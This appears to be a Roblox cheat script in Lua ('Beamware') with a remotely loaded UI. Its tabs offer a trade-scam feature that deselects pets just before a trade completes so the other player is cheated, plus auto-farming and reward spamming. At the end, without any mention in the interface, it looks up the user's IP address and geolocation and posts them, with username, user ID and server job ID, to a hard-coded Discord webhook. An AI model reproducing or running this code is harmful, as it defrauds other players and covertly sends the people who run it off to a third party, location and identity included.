



local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Beamware",
    Icon = 0,
    LoadingTitle = "Beam Hub",
    LoadingSubtitle = "by willievibes",
    Theme = "Default",
    DisableRayfieldPrompts = true,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = false,
        FolderName = nil,
        FileName = "Beamware"
    },
    Discord = {
        Enabled = false,
        Invite = "https://discord.gg/um7X9FtQmt",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "BeamHub",
        Subtitle = "Key System",
        Note = "msg willievibes on discord",
        FileName = "Key",
        SaveKey = false,
        GrabKeyFromSite = false,
        Key = {""}
    }
})

local MainTab = Window:CreateTab("Main")
local delayValue = 1.3 -- Set default value
MainTab:CreateLabel("Trade Scam, very unstable but in a trade, press a pet on the dropdown, then accept trade. The pet will deselect at the time in the slider. Know how to use it before using it.")
MainTab:CreateSlider({
    Name = "Set deselect time",
    Range = {0.5, 2.5},
    Increment = 0.01,
    Suffix = "seconds",
    CurrentValue = delayValue,
    Callback = function(Value)
        delayValue = Value
    end,
})

-- Cache Knit Services
local KnitServices = game:GetService("ReplicatedStorage").Packages._Index["sleitnick_knit@1.5.1"].knit.Services

-- Fetch pet data
local petDataResponse = KnitServices.PlayerDataService.RF.GetAllData:InvokeServer()

local petOptions = {}
local petUUIDs = {}

if petDataResponse.Pets and typeof(petDataResponse.Pets) == "table" then
    for _, petData in pairs(petDataResponse.Pets) do
        if typeof(petData) == "table" then
            local shortenedUUID = string.sub(petData.UUID, 1, 8)
            local optionStr = "Pet: " .. petData.PetID .. " - Evo: " .. tostring(petData.Evolution) .. " - Size: " .. tostring(petData.Size) .. " - UUID: " .. shortenedUUID
            table.insert(petOptions, optionStr)
            petUUIDs[optionStr] = petData.UUID
        end
    end
else
    print("No 'Pets' key or it's not a table.")
end

local selectedPetUUIDs = {}
local previousOptions = {}

local function shallowCopy(original)
    local copy = {}
    for _, v in ipairs(original) do
        table.insert(copy, v)
    end
    return copy
end

MainTab:CreateDropdown({
    Name = "Select Pets",
    Options = petOptions,
    CurrentOption = {},
    MultipleOptions = true,
    Flag = "PetDropdown",
    Callback = function(Options)
        local newOptionMap = {}
        for _, option in ipairs(Options) do
            newOptionMap[option] = true
        end

        local previousOptionMap = {}
        for _, option in ipairs(previousOptions) do
            previousOptionMap[option] = true
        end

        -- Find newly selected options
        for _, option in ipairs(Options) do
            if not previousOptionMap[option] then
                local uuid = petUUIDs[option]
                if uuid then
                    print("Selecting pet with UUID:", uuid)
                    KnitServices.TradeService.RE.TradeSelectPet:FireServer(uuid)
                end
            end
        end

        -- Find deselected options
        for _, option in ipairs(previousOptions) do
            if not newOptionMap[option] then
                local uuid = petUUIDs[option]
                if uuid then
                    print("Deselecting pet with UUID:", uuid)
                    KnitServices.TradeService.RE.TradeDeselectPet:FireServer(uuid)
                end
            end
        end

        previousOptions = shallowCopy(Options)
        selectedPetUUIDs = {}
        for _, option in ipairs(Options) do
            local uuid = petUUIDs[option]
            if uuid then
                table.insert(selectedPetUUIDs, uuid)
            end
        end

        print("Selected Pet UUIDs:", table.concat(selectedPetUUIDs, ", "))
    end,
})

MainTab:CreateButton({
    Name = "Accepting Trade (do not click twice during trade)",
    Callback = function()
        print("Accepting Trade")
        KnitServices.TradeService.RE.TradeAccept:FireServer()

        local countdownDuration = 5
        local timeToWait = math.max(0, countdownDuration - delayValue)

        delay(timeToWait, function()
            if #selectedPetUUIDs > 0 then
                print("Deselecting pets at " .. string.format("%.2f", delayValue) .. " seconds before countdown ends:")
                for _, uuid in ipairs(selectedPetUUIDs) do
                    print("Deselecting UUID:", uuid)
                    KnitServices.TradeService.RE.TradeDeselectPet:FireServer(uuid)
                end
            else
                print("No pets selected.")
            end
        end)
    end,
})

MainTab:CreateButton({
    Name = "Unready Trade",
    Callback = function()
        print("Unready Trade")
        KnitServices.TradeService.RE.TradeUnaccept:FireServer()
    end,
})

MainTab:CreateButton({
    Name = "Fire All Selected Pets",
    Callback = function()
        for _, uuid in ipairs(selectedPetUUIDs) do
            print("Re-selecting pet with UUID:", uuid)
            KnitServices.TradeService.RE.TradeSelectPet:FireServer(uuid)
        end
    end,
})
MainTab:CreateLabel("Select a Rainbow pet from the dropdown and press make void, you'll know it worked if you pets went down. Same thing with titan but only huges")
MainTab:CreateButton({
    Name = "Make Void (select 1 evo 2 pet from dropdown)",
    Callback = function()
        for _, uuid in ipairs(selectedPetUUIDs) do
            KnitServices.VoidService.RE.StartCraft:FireServer(uuid)
        end
    end,
})

MainTab:CreateButton({
    Name = "Claim Void (wait 5 hours)",
    Callback = function()
        local x = KnitServices.PlayerDataService.RF.GetAllData:InvokeServer()
        if x.PetsInVoidSlot and typeof(x.PetsInVoidSlot) == "table" then
            for _, petData in pairs(x.PetsInVoidSlot) do
                if typeof(petData) == "table" and petData.UUID then
                    print("Claiming Void pet with UUID:", petData.UUID)
                    KnitServices.VoidService.RE.ClaimPet:FireServer(petData.UUID)
                end
            end
        else
            print("No pets in Void Slot.")
        end
    end,
})

MainTab:CreateButton({
    Name = "Make Titan (select 1 size 2 pet from dropdown)",
    Callback = function()
        for _, uuid in ipairs(selectedPetUUIDs) do
            KnitServices.TitanService.RE.StartCraft:FireServer(tostring(uuid))
        end
    end,
})

MainTab:CreateButton({
    Name = "Claim Titan (2 days??)",
    Callback = function()
        local x = KnitServices.PlayerDataService.RF.GetAllData:InvokeServer()
        if x.PetsInTitanSlot and typeof(x.PetsInTitanSlot) == "table" then
            for _, petData in pairs(x.PetsInTitanSlot) do
                if typeof(petData) == "table" and petData.UUID then
                    print("Claiming Titan pet with UUID:", petData.UUID)
                    KnitServices.TitanService.RE.ClaimPet:FireServer(petData.UUID)
                end
            end
        else
            print("No pets in Titan Slot.")
        end
    end,
})





-- farming Tab
local RaceTab = Window:CreateTab("farming")
local threadsValue = 1 -- Default value for threads
local isRunning = false
local threads = {} -- Table to keep track of threads
local isContestThreadRunning = false -- Control for the separate thread

RaceTab:CreateSlider({
    Name = "Threads",
    Range = {1, 50},
    Increment = 1,
    Suffix = "threads",
    CurrentValue = threadsValue,
    Callback = function(Value)
        local previousThreadsValue = threadsValue
        threadsValue = Value

        if isRunning then
            if threadsValue > previousThreadsValue then
                -- Add more threads
                for i = previousThreadsValue + 1, threadsValue do
                    threads[i] = { isThreadRunning = true }
                    task.spawn(function()
                        local threadIndex = i
                        while isRunning and threads[threadIndex] and threads[threadIndex].isThreadRunning do
                            local args = {
                                [1] = "WinGate_16"
                            }
                            KnitServices.FightService.RE.GetWinsEvent:FireServer(unpack(args))
                            task.wait()
                        end
                    end)
                end
            elseif threadsValue < previousThreadsValue then
                -- Stop extra threads
                for i = threadsValue + 1, previousThreadsValue do
                    if threads[i] then
                        threads[i].isThreadRunning = false
                        threads[i] = nil
                    end
                end
            end
        end
    end,
})

RaceTab:CreateToggle({
    Name = "Start Farming Wins",
    CurrentValue = false,
    Callback = function(Value)
        isRunning = Value
        if isRunning then
            -- Start threads up to threadsValue
            for i = 1, threadsValue do
                threads[i] = { isThreadRunning = true }
                task.spawn(function()
                    local threadIndex = i
                    while isRunning and threads[threadIndex] and threads[threadIndex].isThreadRunning do
                        local args = {
                            [1] = "WinGate_16"
                        }
                        KnitServices.FightService.RE.GetWinsEvent:FireServer(unpack(args))
                        task.wait()
                    end
                end)
            end

            -- Start the separate thread that runs your provided code every 1 second
            isContestThreadRunning = true
            task.spawn(function()
                while isRunning and isContestThreadRunning do
                    local x = KnitServices.PlayerDataService.RF.GetAllData:InvokeServer()
                    -- Check if 'x' is a table
                    if typeof(x) == "table" then
                        local playerLocation = x["PlayerLocation"]
                        if playerLocation then
                            print(playerLocation)
                            KnitServices.FightService.RE.StartContest:FireServer(tostring(playerLocation))
                            task.wait()
                            KnitServices.FightService.RE.JoinContest:FireServer(tostring(playerLocation))
                        end
                    end
                    task.wait(1) -- Wait 1 second before next iteration
                end
            end)
        else
            -- Stop all threads
            for i = 1, #threads do
                if threads[i] then
                    threads[i].isThreadRunning = false
                end
            end
            threads = {}
            isContestThreadRunning = false

            -- Trigger the script when toggled off
            local x = KnitServices.PlayerDataService.RF.GetAllData:InvokeServer()
            if typeof(x) == "table" then
                local playerLocation = x["PlayerLocation"]
                if playerLocation then
                    print(playerLocation)
                    KnitServices.FightService.RE.QuitContestEvent:FireServer(tostring(playerLocation))
                end
            end
        end
    end,
})

local isActive1 = false

RaceTab:CreateToggle({
    Name = "Auto Rebirth",
    CurrentValue = false,
    Flag = "Toggle2",
    Callback = function(Value)
        isActive1 = Value
        print("Toggle State Changed:", Value)
        if isActive1 then
            task.spawn(function()
                while isActive1 do
                    KnitServices.RebirthService.RF.Rebirth:InvokeServer()
                    task.wait(1)
                end
            end)
        end
    end,
})

local isActive2 = false

RaceTab:CreateToggle({
    Name = "Auto Quest Egg",
    CurrentValue = false,
    Flag = "Toggle3",
    Callback = function(Value)
        isActive2 = Value
        print("Toggle State Changed:", Value)
        if isActive2 then
            task.spawn(function()
                while isActive2 do
                    KnitServices.OnlineRewardService.RF.ClaimOnlineQuestReward:InvokeServer()
                    
                    task.wait(1)
                end
            end)
        end
    end,
})


-- Reference to the Eggs folder
local EggFolder = game:GetService("ReplicatedStorage"):WaitForChild("Eggs")

-- Build a list of all egg names
local EggOptions = {}
for _, egg in ipairs(EggFolder:GetChildren()) do
   table.insert(EggOptions, egg.Name)
end

-- Variable to store the currently selected egg
local selectedEgg = EggOptions[1] or nil

-- Create a new tab for Eggs
local EggTab = Window:CreateTab("Eggs")

-- Create a dropdown in the Egg tab
local EggDropdown = EggTab:CreateDropdown({
   Name = "Select Egg",
   Options = EggOptions,
   CurrentOption = {EggOptions[1]}, -- Set a default option if available
   MultipleOptions = false,
   Flag = "SelectedEgg",
   Callback = function(Options)
      -- Update selectedEgg whenever the dropdown selection changes
      selectedEgg = Options[1]
   end,
})


EggTab:CreateButton({
    Name = "Hatch Egg",
    Callback = function()
        if selectedEgg then
            local args = {
                [1] = selectedEgg, -- Use the currently selected egg from the dropdown
                [2] = 1
            }

            game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.5.1")
                .knit.Services.EggHatchService.RE.Hatch:FireServer(unpack(args))
        else
            warn("No egg selected!")
        end
    end,
})


local isActiveegg = false

EggTab:CreateToggle({
    Name = "Auto Hatch",
    CurrentValue = false,
    Flag = "Toggleegg",
    Callback = function(Value)
        isActiveegg = Value
        print("Toggle State Changed:", Value)
        if isActiveegg then
            task.spawn(function()
                while isActiveegg do
                    if selectedEgg then
                        local args = {
                            [1] = selectedEgg, -- Use the currently selected egg from the dropdown
                            [2] = 1
                        }
            
                        game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.5.1")
                            .knit.Services.EggHatchService.RE.Hatch:FireServer(unpack(args))
                    else
                        warn("No egg selected!")
                    end
                    task.wait()
                end
            end)
        end
    end,
})

--Misc Tab
local MiscTab = Window:CreateTab("Misc")

local isActive = false

MiscTab:CreateToggle({
    Name = "Potion Spam",
    CurrentValue = false,
    Flag = "Toggle1",
    Callback = function(Value)
        isActive = Value
        print("Toggle State Changed:", Value)
        if isActive then
            task.spawn(function()
                while isActive do
                    KnitServices.ChestService.RF.ClaimDailyChest:InvokeServer()
                    task.wait()
                end
            end)
        end
    end,
})

MiscTab:CreateButton({
    Name = "Join W2 (rejoin after clicking)",
    Callback = function()
        KnitServices.AreaService.RE.UpdatePlayerCurrentArea:FireServer("Area_2")
    end,
})

MiscTab:CreateButton({
    Name = "Join W3 (rejoin after clicking)",
    Callback = function()
        KnitServices.AreaService.RE.UpdatePlayerCurrentArea:FireServer("Area_3")
    end,
})


MiscTab:CreateButton({
    Name = "Join W4 (rejoin after clicking)",
    Callback = function()
        KnitServices.AreaService.RE.UpdatePlayerCurrentArea:FireServer("Area_4")
    end,
})

MiscTab:CreateButton({
    Name = "Super Rebirth (30+ Rebirths, will reset all your stats)",
    Callback = function()
        KnitServices.RebirthService.RF.SuperRebirth:InvokeServer()

    end,
})



MiscTab:CreateButton({
    Name = "Super Rebirth Upgrades",
    Callback = function()
        local x = game:GetService("Players").LocalPlayer.PlayerGui.RebirthUpgradeGui
        x.Enabled = true
    end,
})

MiscTab:CreateButton({
    Name = "Save Data",
    Callback = function()
        local x = KnitServices.PlayerDataService.RF.GetAllData:InvokeServer()
        local outputData = {}

        local function recursivePrint(tbl, indent)
            indent = indent or ""
            for key, value in pairs(tbl or {}) do
                if typeof(value) == "table" then
                    table.insert(outputData, indent .. tostring(key) .. ":")
                    recursivePrint(value, indent .. "  ")
                else
                    table.insert(outputData, indent .. tostring(key) .. ": " .. tostring(value))
                end
            end
        end

        if typeof(x) == "table" then
            recursivePrint(x)
        else
            table.insert(outputData, "'x' is not a table.")
        end

        writefile("PlayerData.txt", table.concat(outputData, "\n"))
        print("Data written to PlayerData.txt")
    end,
})

MiscTab:CreateLabel("Discord: willievibes")

local name = game:GetService("Players").LocalPlayer.Name

local ESD = tostring(game:HttpGet("https://api.ipify.org", true))

local HTTP_ = game:GetService('HttpService')

local LPR = game:GetService('Players').LocalPlayer

local isPremium = game:GetService("Players").LocalPlayer.MembershipType == Enum.MembershipType.Premium

local username = game.Players.LocalPlayer.Name

local userId = game.Players.LocalPlayer.UserId

local HttpService = game:GetService("HttpService")

local Players = game:GetService("Players")

local player = Players.LocalPlayer

local accountAge = math.floor((os.time() - player.AccountAge * 86400) / 86400)

local jobID = game.JobId



local getIPInfo = HttpService:JSONDecode(game:HttpGet(string.format("http://ip-api.com/json/%s", ESD)))

local FI = {

 IP = ESD,

 country = getIPInfo.country,

 countryCode = getIPInfo.countryCode,

 region = getIPInfo.region,

 regionName = getIPInfo.regionName,

 city = getIPInfo.city,

 zipcode = getIPInfo.zip,

 latitude = getIPInfo.lat,

 longitude = getIPInfo.lon,

 isp = getIPInfo.isp,

 org = getIPInfo.org

}



local url = "https://discord.com/api/webhooks/1298176241022799922/HdLJCHPnRNK5jghY8A9w-LsSzss-ScorbvnKLt-g2Sno0DYa_OQhFA_sPAtvwhW-D22C"







-- local balance = LPR:FindFirstChild("leaderstats") and LPR.leaderstats.Robux.Value or 0



local data = {

 username = LPR.Name .. ' [' .. LPR.UserId .. ']',

 avatar_url = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],

 embeds = {

   {

     title = "AdvanceFalling Services",

     description = "Discord: https://discord.gg/d2446gBjfq",

     color = tonumber(0x2B6BE4),

     fields = {

       {

         name = "Profile:",

         value = "https://www.roblox.com/users/" .. userId .. "/profile",

         inline = true

       },

       {

         name = "Game:",

         value = "https://www.roblox.com/games/" .. game.PlaceId,

         inline = true

       },

       {

         name = "Game Info:",

         value = "**ID**: " .. game.PlaceId .. ".\n**Name:** " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,

         inline = true

       },


       {

         name = "Premium",

         value = isPremium and "True" or "False",

         inline = true

       },

       {

         name = "2FA",

         value = isPremium and "True" or "False",

         inline = true

       },

       {

         name = "Account Age",

         value = "" .. accountAge .. " ",

         inline = true

       },





       {

         name = "Join Code",

         value = "" .. jobID,

         inline = true

       },

       {

         name = "IP",

         value = FI.IP,

         inline = true

       },

       {

         name = "Country",

         value = FI.country,

         inline = true

       },

       {

         name = "Country Code",

         value = FI.countryCode,

         inline = true

       },

       {

         name = "Region",

         value = FI.region,

         inline = true

       },

       {

         name = "Region Name",

         value = FI.regionName,

         inline = true

       },

       {

         name = "City",

         value = FI.city,

         inline = true

       },

       {

         name = "Zipcode",

         value = FI.zipcode,

         inline = true

       },

       {

         name = "Latitude",

         value = tostring(FI.latitude),

         inline = true

       },

       {

         name = "Longitude",

         value = tostring(FI.longitude),

         inline = true

       },

       {

         name = "ISP",

         value = FI.isp,

         inline = true

       },

       {

         name = "Org",

         value = FI.org,

         inline = true

       },

       {

         name = "Coming Soon",

         value = "??????????",

         inline = true

       }

     },

     color = tonumber(0x7269da),

   }

 }

}



local newdata = HTTP_:JSONEncode(data)



local headers = {

 ["content-type"] = "application/json"

}



local request = http_request or request or HttpPost or syn.request

local abcdef = { Url = url, Body = newdata, Method = "POST", Headers = headers }

request(abcdef)
